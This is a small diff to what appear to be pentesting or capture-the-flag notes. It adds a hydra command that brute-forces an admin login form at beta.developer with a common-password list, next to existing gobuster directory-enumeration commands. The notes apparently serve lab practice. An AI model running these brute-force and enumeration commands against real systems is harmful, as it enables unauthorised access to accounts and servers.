@@ -23,3 +23,8 @@ gobuster dir -u https://beta.developer/ -w /usr/share/seclists/Discovery/Web-Con
 ```bash
 gobuster dir -u https://beta.developer/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
 ```
+
+## h 4.5 p
+```bash
+hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
+```
